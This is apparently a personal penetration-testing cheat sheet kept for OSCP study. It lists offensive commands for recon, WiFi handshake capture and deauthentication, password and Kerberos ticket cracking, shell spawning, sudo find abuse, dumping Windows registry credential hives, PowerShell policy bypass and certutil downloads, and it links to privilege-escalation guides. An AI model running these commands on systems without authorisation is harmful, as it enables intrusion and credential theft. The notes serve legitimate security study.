## Quick recon automation scripts
**autorecon**\
https://github.com/Tib3rius/AutoRecon \
`autorecon 10.10.10.1`

**nmapAutomator**\
https://github.com/21y4d/nmapAutomator \
`nmapAutomator 10.10.10.1 All`

 **Find SMB servers with nmap** \
`nmap -v -A -p 139,445 10.10.01.1-254 -oG smb_servers.txt` \
**Make a list of the servers currently up** \
`cat smb_servers.txt | grep -i open | cut -d" " -f2 > smb_servers_all.txt` \
**nmap pingsweep** \
`nmap  -sP 10.10.10.1-255 -oG out.txt`

## Unordered collection of command line things
**To monitor WiFi, and capture the handshake for decryption**
- `iwconfig`
- `ifconfig wlan0 down`
- `iwconfig wlan0 mode monitor`
- `ifconfig wlan0 up`
- `airmon_ng check wlan0`
- `airodump-ng wlan0`
- `airedump-ng -c CHANNEL --bssid MAC wlan0 -w txtfile wlan0`
- `aireplay-ng -0 0 -a MAC wlan0`
- `wireshark output file`
- `aircrack-ng -w /path/to/wordlist.yxy SCAN_01.cap`

**crunch** \
Dictionary generator \
`crunch 4 5 > passlist` \
https://tools.kali.org/password-attacks/crunch

**john examples** \
*Wordpress, using 4 threads* \
`john --format=phpass wp2_pass.txt --fork=4 --wordlist=/root/john_temp/rockyou.txt` \
*Linux password hash with 4 threads* \
`john --fork=4 unshadowed` \
*SHA1 hash* \
`john --fork=4 temp.txt --format=Raw-SHA1 --wordlist=/root/john_temp/rockyou.txt`

**Hashcat PDF example, 8 characters 0-f** \
`hashcat64.exe -m 10500 pdf.hashfile -a3 --custom-charset1=?dabcdef ?1?1?1?1?1?1?1?1`

**Remote desktop to your Windows target** \
`rdesktop -u guest 10.11.1.230 -g 94%`

**ZIP password cracker** \
`fcrackzip -u -D -p '/root/john_temp/rockyou.txt' targetfile.zip`

**Guess the OS** \
`xprobe2 10.10.10.1`

**Spawning a full shell** \
`python -c 'import pty; pty.spawn("/bin/bash")'` \
`python3 -c 'import pty; pty.spawn("/bin/bash")'` \
`/bin/bash -i` \
`/bin/sh -i` \
`echo os.system('/bin/bash')` \
`script -qc /bin/bash /dev/null` \
`perl -e 'exec "/bin/sh";'` \
`exec "/bin/sh";` \
**From vi**  \
`:!bash` \
`:set shell=/bin/bash:shell`

**Simple HTTP server for delivering items to your target over HTTP** \
`python -m SimpleHTTPServer 80`

**Find all executables with SUID bit set** \
`find / -perm -u=s -type f 2>/dev/null` \
or \
`find /usr/bin -perm -4000`

**Find world-writable files** \
`find / -perm -2 -type f 2>/dev/null`

**plink** \
Connect to my IP, make a remote link on 12.34.56.78:4444 that forwards traffic from 127.0.0.1:9090 \
`plink.exe 12.34.56.78 -R 4444:127.0.0.1:9090`

**WebDAV client** \
`cadaver 10.10.10.1`

## SMBClient
**List shares** \
`smbclient -L //10.10.10.1` \
**Connect to stated share** \
`smbclient //10.10.10.1/Replication` \
**List everything on the share** \
`smbmap -R Replication -H 10.10.10.1`

Look for Groups.xml if needing logon credentials.

**Crack the hashed password found in Groups.xml** \
`gpp-decrypt bighashline`

**Grab the administrator hashed password** \
`GetUserSPNs.py -request 10.10.10.1/SVC_TGS -outputfile admin.txt`

**Crack the password with jumbojohn** \
`/root/jumbojohn/john --format:krb5tgs admin.txt --wordlist=/root/john_temp/rockyou.txt`

**Use wmiexec.py to make a shell** \
`wmiexec.py 10.10.10.1/administrator:crackedpass@10.10.10.1`

**Connect to SQL Server** \
`sqsh -S 10.10.10.1 -U username -P password`

**evil-winrm** \
Remote PS Shell

**Clean up Windows encoding of ASCII file** \
`sed -i -e 's/\r$//' `

**Abusing find command for arbitrary code execution** \
`sudo find /home -exec sh -i \;`

**hash-identified** \
Attempts to guess the hash type

**ASCII to hex** \
`echo -n abcdefgABCDEFG | xxd -p`

**Hex to ASCII** \
`echo -n 6162636465666741424344454647 | xxd -r -p`

## From inside Windows machine
**Grabbing Windows registry details** \
`reg.exe save hklm\sam c:\temp\sam.save` \
`reg.exe save hklm\security c:\temp\security.save` \
`reg.exe save hklm\system c:\temp\system.save`

**Find user privs** \
Remember, disabled state only indicates if priv currently enabled for running process, not what user can actually do. \
`whoami /priv`

**Process list with user** \
`tasklist /v`

**Look at ports listening.connected** \
`netstat -a`

**List local users** \
`net users`

**Powershell bypass policy** \
`powershell -ep bypass`

**PowerShell One-liner** \
`powershell -c <command>`

**Copy files using certutil** \
`certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip`

## Hmm
I have a lot of Windows-related commands saved in my notes, but they all relate to OSCP lab exercises so I don't want to paste them all here for obvious reasons.  These are some of the more generic but useful bookmarks I've made along the way instead.

### LPEWorkshop
Extremely useful to learn more about PE.
- https://github.com/sagishahar/lpeworkshop

### List of HTTP status codes - important to learn some of these for looking at responses
- https://en.wikipedia.org/wiki/List_of_HTTP_status_codes

### General, Win and Lin
- https://pentestacademy.wordpress.com/2016/06/21/common-windows-commands-for-pentesters/
- https://medium.com/@falconspy/useful-oscp-notes-commands-d71b5eda7b02/
- https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms
- https://sushant747.gitbooks.io/total-oscp-guide/content/loot_windows_-_for_credentials_and_other_stuff.html
- https://malikashish8.github.io/Walkthrough/notes/
- https://github.com/enaqx/awesome-pentest
- https://cheatsheet.promiselabs.net
- https://github.com/doffensive/wired-courtyard
- https://st4rk-sec.com/methodology/

### Exploit writing
- https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/

### Linux Privesc
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- https://guif.re/linuxeop

### Windows Privesc
- http://www.fuzzysecurity.com/tutorials/16.html
- https://guif.re/windowseop
- http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html
- https://lolbas-project.github.io
- https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

### DNSAdmin->SYSTEM->Domain compromise
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise

### Weak Windows services
- https://blackwintersecurity.com/tutorials/

### Dumping Windows creds
- https://pure.security/dumping-windows-credentials/

### SMB Enumeration
- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#smbmap

### More than you need to know about tcpdump
- https://danielmiessler.com/study/tcpdump/

### Powershell
- https://www.darknet.org.uk/2016/10/nishang-powershell-for-penetration-testing/

### SQLMap, SQL injection
- https://www.sqlinjection.net/sqlmap/tutorial/
- https://portswigger.net/web-security/sql-injection

### Pivoting
- https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/sshuttle/

### Password attacks
- https://www.kyylee.com/oscp-notes/password-attack
- https://null-byte.wonderhowto.com/forum/cracking-passwords-using-john-ripper-0181420/

### Network enumeration
- https://github.com/julra197/OSCP_PenetrationTesting_Notes/blob/master/network_enumeration

## BOF
- https://github.com/hyperreality/OSCP-Buffer-Overflow-in-30-minutes

## Staged vs stageless MS handlers
- https://buffered.io/posts/staged-vs-stageless-handlers/
